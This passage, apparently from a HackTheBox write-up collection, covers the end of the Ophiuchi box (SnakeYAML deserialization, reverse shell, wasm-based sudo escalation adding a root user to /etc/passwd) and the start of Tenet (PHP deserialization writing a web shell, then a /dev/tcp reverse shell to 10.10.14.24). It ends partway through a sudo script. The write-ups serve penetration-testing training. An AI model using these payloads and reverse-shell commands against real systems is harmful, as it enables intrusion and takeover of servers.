!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://10.10.14.24\"]]]]   Submitting the PoC to the parser it was possible to obtain a connection back to the attacker machine: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ophiuchi] ‚îî‚îÄ$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.227 - - [02/May/2021 13:34:48] \"GET / HTTP/1.1\" 200 -   Confirmed the existence of the vulnerability, to get a working RCE it was necessary to craft a specific payload or alternatively find an working one. After some googling the following GitHub repo was found, presenting itself as ‚ÄúA tiny project for generating payloads for the SnakeYAML deserialization gadget‚Äù. Repo: https://github.com/artsploit/yaml-payload  Once cloned the repository, the AwesomeScriptEngineFactory.java file was edited to download a malicious bash reverse shell on the target: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/yaml-payload] ‚îî‚îÄ$ nano src/artsploit/AwesomeScriptEngineFactory.java  import javax.script.ScriptEngineFactory; import java.io.IOException; import java.util.List;  public class AwesomeScriptEngineFactory implements ScriptEngineFactory {      public AwesomeScriptEngineFactory() {         try {         Runtime.getRuntime().exec(\"curl http://10.10.14.24/rs.sh -o /tmp/revshell.sh\");         } catch (IOException e) {             e.printStackTrace();         }     }         ...   The bash reverse shell was the following one: #!/bin/sh bash -i &gt;&amp; /dev/tcp/10.10.14.24/80 0&gt;&amp;1   After having prepared the payloads, the java file was compiled as described inside the repo and the second stage payload was hosted: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/yaml-payload] ‚îî‚îÄ$ javac src/artsploit/AwesomeScriptEngineFactory.java Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/yaml-payload] ‚îî‚îÄ$ jar -cvf yaml-payload.jar -C src/ . Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true added manifest adding: artsploit/(in = 0) (out= 0)(stored 0%) adding: artsploit/AwesomeScriptEngineFactory.java(in = 1563) (out= 431)(deflated 72%) adding: artsploit/AwesomeScriptEngineFactory.class(in = 1635) (out= 692)(deflated 57%) ignoring entry META-INF/ adding: META-INF/services/(in = 0) (out= 0)(stored 0%) adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/yaml-payload] ‚îî‚îÄ$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...   The exploit was then submitted to the parser and the second stage payload was downloaded: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://10.10.14.24/yaml-payload.jar\"]]]]   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/yaml-payload] ‚îî‚îÄ$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.227 - - [02/May/2021 16:14:01] \"GET /yaml-payload.jar HTTP/1.1\" 200 -   Once downloaded the bash reverse shell on the target, it was necessary to execute it. To achieve the task the AwesomeScriptEngineFactory.java was edited once again, this time with the purpose to execute the previously uploaded bash script and provide a reverse shell.  Second payload: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/yaml-payload] ‚îî‚îÄ$ nano src/artsploit/AwesomeScriptEngineFactory.java  import javax.script.ScriptEngineFactory; import java.io.IOException; import java.util.List;  public class AwesomeScriptEngineFactory implements ScriptEngineFactory {      public AwesomeScriptEngineFactory() {         try {         //Runtime.getRuntime().exec(\"curl http://10.10.14.24:443/rs.sh -o /tmp/rev.sh\");         Runtime.getRuntime().exec(\"bash /tmp/rev.sh\");         } catch (IOException e) {             e.printStackTrace();         }     } \t...   Compiled and hosted the payload once again: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/yaml-payload] ‚îî‚îÄ$ javac src/artsploit/AwesomeScriptEngineFactory.java Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/yaml-payload] ‚îî‚îÄ$ jar -cvf yaml-payload.jar -C src/ . Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true added manifest adding: artsploit/(in = 0) (out= 0)(stored 0%) adding: artsploit/AwesomeScriptEngineFactory.java(in = 1563) (out= 431)(deflated 72%) adding: artsploit/AwesomeScriptEngineFactory.class(in = 1635) (out= 692)(deflated 57%) ignoring entry META-INF/ adding: META-INF/services/(in = 0) (out= 0)(stored 0%) adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/yaml-payload] ‚îî‚îÄ$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.227 - - [02/May/2021 16:14:01] \"GET /yaml-payload.jar HTTP/1.1\" 200 - 10.10.10.227 - - [02/May/2021 16:14:01] \"GET /yaml-payload.jar HTTP/1.1\" 200 -   Executed the second stage on the target machine and obtained the reverse shell:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ophiuchi] ‚îî‚îÄ$ sudo nc -nlvp 10099 listening on [any] 10099 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.227] 53984 bash: cannot set terminal process group (831): Inappropriate ioctl for device bash: no job control in this shell tomcat@ophiuchi:/$ id id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) tomcat@ophiuchi:/$ which python3 which python3 /usr/bin/python3 tomcat@ophiuchi:/$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' python3 -c 'import pty;pty.spawn(\"/bin/bash\")' tomcat@ophiuchi:/$ ^Z zsh: suspended  sudo nc -nlvp 10099  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ophiuchi] ‚îî‚îÄ$ stty raw -echo; fg  [1]  + continued  sudo nc -nlvp 10099  tomcat@ophiuchi:/$ export TERM=xterm   Lateral Movement to admin During the enumeration phase it was not possible to access the /manager/ area with default credentials, meaning that credentials was different. Finding them would be an easy win in case of password reuse.  Searched tomcat admin credentials: tomcat@ophiuchi:~$ grep -ri 'password' . --color 2&gt;/dev/null ... ./conf/tomcat-users.xml:&lt;user username=\"admin\" password=\"whythereisalimit\" roles=\"manager-gui,admin-gui\"/&gt; ...   Logged as admin reusing tomcat credentials: tomcat@ophiuchi:~$ su admin Password: whythereisalimit admin@ophiuchi:/opt/tomcat$ id uid=1000(admin) gid=1000(admin) groups=1000(admin)  Video   Privilege Escalation Enumerated sudo privileges for the admin user: admin@ophiuchi:~$ sudo -l Matching Defaults entries for admin on ophiuchi:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User admin may run the following commands on ophiuchi:     (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go   Enumerated contents of /opt/wasm-functions/index.go: package main  import (         \"fmt\"         wasm \"github.com/wasmerio/wasmer-go/wasmer\"         \"os/exec\"         \"log\" )   func main() {         bytes, _ := wasm.ReadBytes(\"main.wasm\")          instance, _ := wasm.NewInstance(bytes)         defer instance.Close()         init := instance.Exports[\"info\"]         result,_ := init()         f := result.String()         if (f != \"1\") {                 fmt.Println(\"Not ready to deploy\")         } else {                 fmt.Println(\"Ready to deploy\")                 out, err := exec.Command(\"/bin/sh\", \"deploy.sh\").Output()                 if err != nil {                         log.Fatal(err)                 }                 fmt.Println(string(out))         } }   Enumerated contents of /opt/wasm-functions/: admin@ophiuchi:~$ ls -al /opt/wasm-functions/ total 3928 drwxr-xr-x 3 root root    4096 Oct 14  2020 . drwxr-xr-x 5 root root    4096 Oct 14  2020 .. drwxr-xr-x 2 root root    4096 Oct 14  2020 backup -rw-r--r-- 1 root root      88 Oct 14  2020 deploy.sh -rwxr-xr-x 1 root root 2516736 Oct 14  2020 index -rw-rw-r-- 1 root root     522 Oct 14  2020 index.go -rwxrwxr-x 1 root root 1479371 Oct 14  2020 main.wasm   What this script do is importing the wasm function from github.com/wasmerio/wasmer-go/wasme, reading a the main.wasm file, extracting the info field and controlling its value. In case info is different by 1 the script print an error message, otherwise it execute the deploy.sh script. What stands out is that the script executes delpoy.sh without specifying the absolute path of the file. ... func main() {         bytes, _ := wasm.ReadBytes(\"main.wasm\") \t\t...                 out, err := exec.Command(\"/bin/sh\", \"deploy.sh\").Output()         ...  Relative path can be abused in order to execute arbitrary code from any user‚Äôs writable path. By being able to control the flow of the program it would be possible to execute an arbitrary script with elevated privileges(thanks to sudo).  First of all, a bash script that inject a second arbitrary root user was created inside the user directory: admin@ophiuchi:~$ echo '#!/bin/bash' &gt; deploy.sh admin@ophiuchi:~$ echo 'echo \"root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash\" &gt;&gt; /etc/passwd' &gt; deploy.sh admin@ophiuchi:~$ cat deploy.sh #!/bin/bash echo \"root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash\" &gt;&gt; /etc/passwd   Then the main.wasm file was searched and copied on the current directory in order to have the file which allows to control the data flow of the script: admin@ophiuchi:/$ find / -name main.wasm 2&gt;/dev/null /opt/wasm-functions/main.wasm /opt/wasm-functions/backup/main.wasm admin@ophiuchi:~$ cp /opt/wasm-functions/backup/main.wasm . admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go Not ready to deploy  Unfortunately the program returned ‚ÄúNot ready to deploy‚Äù, meaning that the main.wasm file returned an info value different then 1.  Googling around about information on wasm files and how to work with them, a GitHub repository named WebAssembly Binary Toolkit (wabt) showed up. The toolkit allowed to transform .wasm file into .wat (WebAssembly Text), edit them and then rebuild .wat into .wasm files. This allowed to create a file that would have executed the deployment and therefore the backdoor created previously.  To begin with, after installing wabt the wasm file was downloaded using scp and was decompiled to understand its functionality: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/Ophiuchi/exploit/wabt/build] ‚îî‚îÄ$ scp admin@10.10.10.227:/home/admin/main.wasm ../../main.wasm admin@10.10.10.227 password: main.wasm  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/wabt] ‚îî‚îÄ$ bin/wasm-decompile ../main.wasm -o ../main.dcmp  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/wabt] ‚îî‚îÄ$ cat ../main.dcmp export memory memory(initial: 16, max: 0);  global g_a:int = 1048576; export global data_end:int = 1048576; export global heap_base:int = 1048576;  table T_a:funcref(min: 1, max: 1);  export function info():int {   return 0 }   Having understood how it works and figured out where to make the change that would allow the go script to be controlled, the wasm file was transformed into wat, it was modified, and it was transformed back into wasm again. ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/wabt] ‚îî‚îÄ$ bin/wasm2wat ../main.wasm (module   (type (;0;) (func (result i32)))   (func $info (type 0) (result i32)     i32.const 0)   (table (;0;) 1 1 funcref)   (memory (;0;) 16)   (global (;0;) (mut i32) (i32.const 1048576))   (global (;1;) i32 (i32.const 1048576))   (global (;2;) i32 (i32.const 1048576))   (export \"memory\" (memory 0))   (export \"info\" (func $info))   (export \"__data_end\" (global 1))   (export \"__heap_base\" (global 2)))  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/wabt] ‚îî‚îÄ$ bin/wasm2wat ../main.wasm -o ../main.wat  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/wabt] ‚îî‚îÄ$ nano ../main.wat ... (func $info (type 0) (result i32)     i32.const 1) ... ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/wabt] ‚îî‚îÄ$ bin/wat2wasm ../main.wat -o ../test.wasm   Decompiling the new wasm file resulted in a function returning info equals to 1, allowing to control index.go: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/wabt] ‚îî‚îÄ$ bin/wasm-decompile ../test.wasm export memory memory(initial: 16, max: 0);  global g_a:int = 1048576; export global data_end:int = 1048576; export global heap_base:int = 1048576;  table T_a:funcref(min: 1, max: 1);  export function info():int {   return 1 }   To conclude, the new wasm file was uploaded to the target and the go script was executed saying it was Ready to deploy the malicious deploy.sh script. An arbitrary root2 user was successfully injected and it was used to escalate to root: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/box/Ophiuchi/exploit/wabt] ‚îî‚îÄ$ scp ../test.wasm admin@10.10.10.227:/home/admin/main.wasm   admin@10.10.10.227 password: test.wasm\t\t\t\t\t\t\t\t\t\t\t\t100%  112     2.0KB/s   00:00  admin@ophiuchi:~$ ls deploy.sh  main.wasm  user.txt admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go Ready to deploy  admin@ophiuchi:~$ tail /etc/passwd ... admin:x:1000:1000:,,,:/home/admin:/bin/bash root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash  admin@ophiuchi:~$ su root2 Password: evil root@ophiuchi:/home/admin# whoami &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ifconfig -a root ophiuchi 96adc130ebd6b788b72b64b358cb0cab ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 10.10.10.227  netmask 255.255.255.0  broadcast 10.10.10.255         inet6 dead:beef::250:56ff:feb9:c237  prefixlen 64  scopeid 0x0&lt;global&gt;         inet6 fe80::250:56ff:feb9:c237  prefixlen 64  scopeid 0x20&lt;link&gt;         ether 00:50:56:b9:c2:37  txqueuelen 1000  (Ethernet)         RX packets 5443  bytes 456406 (456.4 KB)         RX errors 0  dropped 39  overruns 0  frame 0         TX packets 2998  bytes 2858019 (2.8 MB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536         inet 127.0.0.1  netmask 255.0.0.0         inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;         loop  txqueuelen 1000  (Local Loopback)         RX packets 9778  bytes 707444 (707.4 KB)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 9778  bytes 707444 (707.4 KB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0     Video   Trophy Two possibilities exist: either we are alone in the Universe or we are not. Both are equally terrifying. - Arthur C. Clarke"
  },
  
  {
    "title": "HackTheBox - Tenet",
    "url": "/posts/tenet/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox, deserialization",
    "date": "2021-06-12 00:00:00 +0200",
    "content": "Introduction Tenet is a medium difficulty Linux box based on code review. Initial enumeration allowed to discover a PHP file vulnerable to PHP deserialization, allowing to get a foothold on the box. Local enumeration allowed to discover hardcoded credentials and reuse them to get user access. From there, privilege escalation can be achieved exploiting a race condition on a sudo script which allowed to overwrite root‚Äôs private key and obtain a high privileged access.  Improved skills:    Code review   PHP deserialization attacks   Exploiting race condition   Poisoning unsecured file   Used tools:    nmap   gobuster   wpscan   custom PHP script     Enumeration Scanned all TCP ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ sudo nmap -p- 10.10.10.223 -sS -Pn -v ... PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http   Enumerated open TCP ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ sudo nmap -p22,80 10.10.10.223 -sT -sV -sC -Pn -v -oN scans/open-tcp-ports.txt ... PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) |   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) |_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_  Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   Nmap revealed an Apache2 Ubuntu Default Page on port 80 and an OpenSSH service on port 22.   Because SSH usually does not offer a large attack surface, enumeration of target was primary focused on port 80. In order to find any possible entry point, web files and directories were enumerated using gobuster: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.223/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/p80-enum-dirs.txt -f -r ... /icons/               (Status: 403) [Size: 277] /server-status/       (Status: 403) [Size: 277]  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.223/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -o scans/p80-enum-files.txt ... /index.html           (Status: 200) [Size: 10918] /.htaccess            (Status: 403) [Size: 277] /.                    (Status: 200) [Size: 10918] /.html                (Status: 403) [Size: 277] /.php                 (Status: 403) [Size: 277] /.htpasswd            (Status: 403) [Size: 277] /.htm                 (Status: 403) [Size: 277] /.htpasswds           (Status: 403) [Size: 277] /.htgroup             (Status: 403) [Size: 277] /wp-forum.phps        (Status: 403) [Size: 277] /.htaccess.bak        (Status: 403) [Size: 277] /.htuser              (Status: 403) [Size: 277] /.htc                 (Status: 403) [Size: 277] /.ht                  (Status: 403) [Size: 277] /users.txt            (Status: 200) [Size: 7]  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.223/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o scans/p80-common-ext.txt -x txt,php,html ... /.php                 (Status: 403) [Size: 277] /.html                (Status: 403) [Size: 277] /.html.txt            (Status: 403) [Size: 277] /.html.php            (Status: 403) [Size: 277] /.html.html           (Status: 403) [Size: 277] /index.html           (Status: 200) [Size: 10918] /.htm.txt             (Status: 403) [Size: 277] /.htm.php             (Status: 403) [Size: 277] /.htm.html            (Status: 403) [Size: 277] /.htm                 (Status: 403) [Size: 277] /users.txt            (Status: 200) [Size: 7] /.                    (Status: 200) [Size: 10918] /wordpress            (Status: 301) [Size: 316] [--&gt; http://10.10.10.223/wordpress/] /.htaccess.php        (Status: 403) [Size: 277] /.htaccess.html       (Status: 403) [Size: 277] /.htaccess            (Status: 403) [Size: 277] /.htaccess.txt        (Status: 403) [Size: 277] /.phtml               (Status: 403) [Size: 277] /.htc                 (Status: 403) [Size: 277] /.htc.txt             (Status: 403) [Size: 277] /.htc.php             (Status: 403) [Size: 277] /.htc.html            (Status: 403) [Size: 277] /.html_var_de         (Status: 403) [Size: 277] /.html_var_de.txt     (Status: 403) [Size: 277] /.html_var_de.php     (Status: 403) [Size: 277] /.html_var_de.html    (Status: 403) [Size: 277] /server-status        (Status: 403) [Size: 277]   Enumeration revealed a /wordpress/ directory:   Because the links of the page were pointing to tenet.htb and were messing up the resulting page, the domain was added to /etc/hosts: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Tenet] ‚îî‚îÄ$ sudo nano /etc/hosts ... 10.10.10.223    tenet.htb    Because the target was a wordpress site, it was enumerated using wpscan: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/scans] ‚îî‚îÄ$ wpscan --url http://tenet.htb/ -o p80-wordpress.txt ... [+] URL: http://tenet.htb/ [10.10.10.223] [+] Started: Fri May  7 15:30:59 2021  Interesting Finding(s):  [+] Headers  | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)  | Found By: Headers (Passive Detection)  | Confidence: 100%  [+] XML-RPC seems to be enabled: http://tenet.htb/xmlrpc.php  | Found By: Direct Access (Aggressive Detection)  | Confidence: 100%  | References:  |  - http://codex.wordpress.org/XML-RPC_Pingback_API  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/  |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/  [+] WordPress readme found: http://tenet.htb/readme.html  | Found By: Direct Access (Aggressive Detection)  | Confidence: 100%  [+] Upload directory has listing enabled: http://tenet.htb/wp-content/uploads/  | Found By: Direct Access (Aggressive Detection)  | Confidence: 100%  [+] The external WP-Cron seems to be enabled: http://tenet.htb/wp-cron.php  | Found By: Direct Access (Aggressive Detection)  | Confidence: 60%  | References:  |  - https://www.iplocation.net/defend-wordpress-from-ddos  |  - https://github.com/wpscanteam/wpscan/issues/1299  [+] WordPress version 5.6 identified (Outdated, released on 2020-12-08).  | Found By: Rss Generator (Passive Detection)  |  - http://tenet.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6&lt;/generator&gt;  |  - http://tenet.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6&lt;/generator&gt;  [+] WordPress theme in use: twentytwentyone  | Location: http://tenet.htb/wp-content/themes/twentytwentyone/  | Last Updated: 2021-03-09T00:00:00.000Z  | Readme: http://tenet.htb/wp-content/themes/twentytwentyone/readme.txt  | [!] The version is out of date, the latest version is 1.2  | Style URL: http://tenet.htb/wp-content/themes/twentytwentyone/style.css?ver=1.0  | Style Name: Twenty Twenty-One  | Style URI: https://wordpress.org/themes/twentytwentyone/  | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...  | Author: the WordPress team  | Author URI: https://wordpress.org/  |  | Found By: Css Style In Homepage (Passive Detection)  |  | Version: 1.0 (80% confidence)  | Found By: Style (Passive Detection)  |  - http://tenet.htb/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: 'Version: 1.0'  At this point we had good information about the target, however there was still no exploitable vulnerabilities.  Further enumeration of the site reveled an interesting comment made by neil talking about a php and a backup file:    We‚Äôre moving our data over from a flat file structure to something a bit more substantial. Please bear with us whilst we get one of our devs on the migration, which shouldn‚Äôt take too long.  Thank you for your patience      neil: did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!   The search on tenet.htb was unsuccessful, but the IP search allowed to access the two files:     Foothold The backup file contained the source code of  sator.php: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/loot] ‚îî‚îÄ$ cat -n  sator.php.bak      1  &lt;?php      2      3  class DatabaseExport      4  {      5          public $user_file = 'users.txt';      6          public $data = '';      7      8          public function update_db()      9          {     10                  echo '[+] Grabbing users from text file &lt;br&gt;';     11                  $this-&gt; data = 'Success';     12          }     13     14     15          public function __destruct()     16          {     17                  file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);     18                  echo '[] Database updated &lt;br&gt;';     19          //      echo 'Gotta get this working properly...';     20          }     21  }     22     23  $input = $_GET['arepo'] ?? '';     24  $databaseupdate = unserialize($input);     25     26  $app = new DatabaseExport;     27  $app -&gt; update_db();     28     29     30  ?&gt;   Looking at the code was possible to detect a PHP deserialization vulnerability caused by the __destruct() magic method, which is called every time there are no other references to a particular object  during the shutdown sequence (more info here).  By design the function updates the users.txt file on the server using the $app object, however because the unserialize() methods allowed to instantiate a new custom object $databaseupdate, it was possible to exploit the PHP deserialization and abuse the __destruct() to write arbitrary file on disk, leading to remote code execution.  The script used to craft the PoC was the following one: &lt;?php  class DatabaseExport {         public $user_file = 'test.txt';         public $data = '10099 the test'; }  $app = new DataBaseExport; $serialized = serialize($app); echo $serialized;  ?&gt;   It was used to serialize a custom object: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/exploit] ‚îî‚îÄ$ php serializer.php O:14:\"DatabaseExport\":2:{s:9:\"user_file\";s:8:\"test.txt\";s:4:\"data\";s:14:\"10099 the test\";}   The serialized object was passed to the vulnerable function:   test.txt was created, meaning that the PoC worked and the target is vulnerable:   To get remote code execution the script was modified to write a simple web shell on the target: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/exploit] ‚îî‚îÄ$ cat -n serializer.php      1  &lt;?php      2      3  class DatabaseExport      4  {      5          public $user_file = 'maoutis.php';      6          public $data = '&lt;?php if(isset($_REQUEST[\"cmd\"])){ echo \"&lt;pre&gt;\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"&lt;/pre&gt;\"; die; }?&gt;';      7  }      8      9  $app = new DataBaseExport;     10  $serialized = serialize($app);     11  echo $serialized;     12     13  ?&gt;  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/exploit] ‚îî‚îÄ$ php serializer.php O:14:\"DatabaseExport\":2:{s:9:\"user_file\";s:11:\"maoutis.php\";s:4:\"data\";s:113:\"&lt;?php if(isset($_REQUEST[\"cmd\"])){ echo \"&lt;pre&gt;\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"&lt;/pre&gt;\"; die; }?&gt;\";}   Then the exploit object was passed to the vulnerable function and the web shell was generated:    Finally the reverse shell command was sent to the web shell and a reverse connection was obtained: http://10.10.10.223/maoutis.php?cmd=/bin/bash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.14.24/10099+0&gt;%261  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/exploit] ‚îî‚îÄ$ nc -nlvp 10099 listening on [any] 10099 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.223] 30304 bash: cannot set terminal process group (1642): Inappropriate ioctl for device bash: no job control in this shell www-data@tenet:/var/www/html$ whoami whoami www-data www-data@tenet:/var/www/html$ www-data@tenet:/var/www/html$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' python3 -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@tenet:/var/www/html$ ^Z zsh: suspended  nc -nlvp 10099  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/exploit] ‚îî‚îÄ$ stty raw -echo; fg  [1]  + continued  nc -nlvp 10099  www-data@tenet:/var/www/html$ export TERM=xterm www-data@tenet:/var/www/html$ stty rows 60 columns 235   Lateral Movement Enumerated local users: www-data@tenet:/var$ cat /etc/passwd | grep -v nologin root:x:0:0:root:/root:/bin/bash sync:x:4:65534:sync:/bin:/bin/sync lxd:x:105:65534::/var/lib/lxd/:/bin/false pollinate:x:109:1::/var/cache/pollinate:/bin/false mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false neil:x:1001:1001:neil,,,:/home/neil:/bin/bash   Wordpress configuration file leaked mysql credentials: www-data@tenet:/var/www/html/wordpress$ cat -s wp-config.php ... // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'wordpress' );  /** MySQL database username */ define( 'DB_USER', 'neil' );  /** MySQL database password */ define( 'DB_PASSWORD', 'Opera&lt;redacted&gt;' );  /** MySQL hostname */ define( 'DB_HOST', 'localhost' );   Because neil reused the same password, it was possible to get user access to the target machine using leaked credentials: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Tenet/exploit] ‚îî‚îÄ$ ssh neil@tenet.htb neil@tenet.htb's password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)   * Documentation:  https://help.ubuntu.com  * Management:     https://landscape.canonical.com  * Support:        https://ubuntu.com/advantage    System information as of Fri May  7 22:39:29 UTC 2021    System load:  0.0                Processes:             185   Usage of /:   15.4% of 22.51GB   Users logged in:       0   Memory usage: 12%                IP address for ens160: 10.10.10.223   Swap usage:   0%   53 packages can be updated. 31 of these updates are security updates. To see these additional updates run: apt list --upgradable  Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings   Last login: Fri May  7 19:57:44 2021 from 10.10.14.13 neil@tenet:~$ id uid=1001(neil) gid=1001(neil) groups=1001(neil)   Privilege Escalation Enumerated neil sudo privileges: neil@tenet:~/.local/share/nano$ sudo -l Matching Defaults entries for neil on tenet:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:  User neil may run the following commands on tenet:     (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh   Enumerated enableSSH.sh: neil@tenet:~/.local/share/nano$ cat -sn /usr/local/bin/enableSSH.sh      1  #!/bin/bash      2      3  checkAdded() {      4      5          sshName=$(/bin/echo $key | /usr/bin/cut -d \" \" -f 3)      6      7          if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then      